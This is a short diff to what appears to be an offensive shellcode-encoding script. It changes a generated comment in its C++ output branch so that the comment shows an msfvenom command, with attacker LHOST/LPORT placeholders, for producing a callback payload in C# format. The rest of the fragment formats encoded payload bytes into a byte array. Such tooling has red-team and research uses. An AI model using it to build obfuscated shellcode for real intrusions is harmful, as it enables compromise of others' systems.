@@ -106,7 +106,7 @@ elif args.format == "cpp":
 
     payLen = len(encodedPayload)
     payload = re.sub("(.{64})", "    \"\\1\"\n", ''.join(encodedPayload), 0, re.DOTALL)
-    payloadFormatted  = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f c\n"
+    payloadFormatted  = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
     payloadFormatted += f"// {args.encoding}-encoded with key {hex(args.key)}\n"
     payloadFormatted += f"unsigned char buffer[] =\n    {payload.strip()};"
     if payLen > 1000:
